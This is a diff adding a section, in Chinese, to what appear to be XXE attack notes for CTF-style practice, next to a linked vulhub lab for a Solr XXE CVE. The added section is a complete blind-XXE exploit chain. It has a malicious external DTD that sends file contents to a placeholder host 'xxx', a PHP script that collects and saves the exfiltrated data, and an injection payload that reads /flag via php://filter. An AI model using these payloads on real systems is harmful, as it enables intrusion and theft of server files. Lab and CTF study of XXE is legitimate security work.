@@ -126,3 +126,36 @@ xxe.dtd
 ```
 get请求url最好全编码，而不是只有url路径编码。
 <https://github.com/vulhub/vulhub/tree/master/solr/CVE-2017-12629-XXE>
+
+
+^
+### 3.无回显XXE文件读取：
+服务器文件1.dtd
+```
+# pd.dtd
+<!ENTITY % all
+"<!ENTITY &#x25; send SYSTEM 'http://xxx/xxe.php?q=%file;'>"
+>
+%all;
+```
+用php接收
+```
+# xxe.php
+<?php
+highlight_file(__FILE__);
+$xxe = base64_decode($_GET['q']);
+$txt = 'flag.txt';
+file_put_contents($txt,$xxe,FILE_APPEND)
+?>
+```
+注入点
+```
+[POST]Payload:
+
+<!DOCTYPE ANY [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+<!ENTITY % dtd SYSTEM "http://xxx/pd.dtd">
+%dtd;
+%send;
+] >
+```
